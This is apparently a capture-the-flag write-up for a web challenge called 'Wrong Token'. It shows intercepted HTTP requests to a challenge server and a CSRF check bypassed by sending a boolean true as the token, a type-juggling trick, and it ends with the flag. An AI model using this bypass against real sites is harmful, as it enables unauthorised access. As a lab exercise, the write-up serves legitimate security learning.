# Challenge Name: Wrong Token
- Level: hard

## Challenge Description:
Request to the flag is forbidden due to wrong csrf token ... can you fix it and reveal the flag.\

Link: http://34.76.107.218/wrongtoken/

## Solution:
1 - Go to http://34.76.107.218/wrongtoken/
2 - Look at souce code
```
    <script type="text/javascript">
		$.ajax('index.php', {
		    type: 'post',
		    contentType: 'application/json',
		    data: '{"action": "view_flag", "_token": "asdjhDJhfkjdI"}',
		});
    </script>
```

3 - Intercept request with Burp Suit
```
GET /wrongtoken/ HTTP/1.1
Host: 34.76.107.218
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

4 - Re-send request with the new params
```
POST /wrongtoken/index.php HTTP/1.1
Host: 34.76.107.218
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 52
Content-Type: application/json

{"action": "view_flag", "_token": "asdjhDJhfkjdI"}
```
- Response: `Failed Comparison ( incoming CSRF token != Session CSRF token )`

5 - Bypass token verif
- Try with `"_token": true`
- Response: flag is : dkjfhsdkhfr43r34r3